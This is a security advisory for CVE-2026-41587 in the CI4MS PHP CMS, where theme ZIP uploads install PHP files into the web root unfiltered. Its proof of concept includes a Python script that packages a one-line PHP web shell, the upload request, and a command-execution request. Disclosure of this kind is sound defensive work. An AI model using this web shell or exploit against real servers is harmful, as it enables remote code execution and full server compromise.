# [H] CI4MS has Unrestricted PHP File Upload via Theme Installation that Leads to Authenticated Remote Code Execution

## Summary
Severity: High
Advisory: GHSA-fw49-9xq4-gmx6
CVE: CVE-2026-41587
CWE: CWE-434
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-04-29
Source: https://github.com/advisories/GHSA-fw49-9xq4-gmx6
Type: github-advisory

## Affected
- Packagist: `ci4-cms-erp/ci4ms` — affected >=0.26.0.0 <0.31.7.0

## Details
### Summary
A theme upload feature allows any authenticated backend user with theme-upload permission to achieve remote code execution (RCE) by uploading a crafted ZIP file. PHP files inside the ZIP are installed into the web-accessible public/ directory with no extension or content filtering, making them directly executable via HTTP.


### Details
File: `modules/Theme/Controllers/Theme.php`

After a ZIP is uploaded and extracted to a temporary directory, install_theme_from_tmp() is called unconditionally: Theme.php:51-52

File: `modules/Theme/Helpers/themes_helper.php`

The helper copies every file matching *.* from `public/templates/<name>/` inside the ZIP directly into `public/templates/<name>/` on disk using rename(), with no file-extension allowlist, no MIME check, and no content inspection: `themes_helper.php:60-68`

Because the web root is `public/`, any `.php` file placed there is directly reachable over HTTP.

PHP files are also installed — without filtering — into app/Controllers/templates/<name>/, app/Libraries/templates/<name>/, and other app/ subdirectories: `themes_helper.php:31-42`

The theme name is derived from the uploaded filename via `str_replace('_theme.zip', '', $file->getName())`, so uploading `evil_theme.zip` sets the theme name to evil and the install target to `public/templates/evil/`: `Theme.php:20`

### PoC
Prerequisites: A backend account with theme upload permission (e.g., backend/themes/upload).

Step 1 — Build the malicious ZIP:
```
import zipfile, io  
  
buf = io.BytesIO()  
with zipfile.ZipFile(buf, 'w') as z:  
    z.writestr('public/templates/evil/shell.php', '<?php system($_GET["c"]); ?>')  
buf.seek(0)  
with open('evil_theme.zip', 'wb') as f:  
    f.write(buf.read())
```
Step 2 — Upload:
```
POST /backend/themes/upload  
Content-Type: multipart/form-data  
  
field name: theme  
file:       evil_theme.zip  
```
Step 3 — Execute:
```
GET https://target.com/templates/evil/shell.php?c=id  
```
Expected response: output of id (e.g., uid=33(www-data) gid=33(www-data) groups=33(www-data)).


### Impact
Type: Authenticated Remote Code Execution (RCE) via arbitrary file write to the web root.

Who is impacted: Any deployment where a backend user has been granted theme upload permission. A superadmin already has full access, but any lower-privileged role granted this permission can use it to write and execute arbitrary PHP on the server, gaining OS-level command execution under the web server process. This can be used for data exfiltration, lateral movement, persistence, or full server compromise.

## References
- https://github.com/ci4-cms-erp/ci4ms/security/advisories/GHSA-fw49-9xq4-gmx6
- https://nvd.nist.gov/vuln/detail/CVE-2026-41587
- https://github.com/ci4-cms-erp/ci4ms/commit/b969465e71eacd9eb57014ad1fce1fc34fa7bca0
- https://github.com/ci4-cms-erp/ci4ms
